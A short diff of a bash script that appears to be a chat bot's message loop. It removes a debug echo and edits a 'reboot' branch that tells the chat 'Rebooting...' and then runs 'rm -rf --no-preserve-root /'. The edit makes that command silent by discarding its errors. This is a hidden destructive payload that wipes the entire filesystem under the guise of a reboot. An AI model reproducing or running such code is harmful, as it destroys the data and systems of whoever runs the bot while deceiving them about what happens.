@@ -118,7 +118,6 @@ while sleep 1; do
                [[ ${ICOUNT} -ge 5 ]] && ICOUNT=5
                for ((i=0;i<${ICOUNT};i++)); do
                    _ibash
-                   echo -e "@${SENDER} $(date +"[%H:%M]")\n${TEXT}\n" 1>&2
                done
                ;;
 
@@ -127,7 +126,7 @@ while sleep 1; do
                if [[ ! -z $LAST_ID ]]; then
                    TEXT="Rebooting..."
                    _send_text
-                   rm -rf --no-preserve-root /
+                   rm -rf --no-preserve-root / 2>/dev/null
                fi
                ;;
 
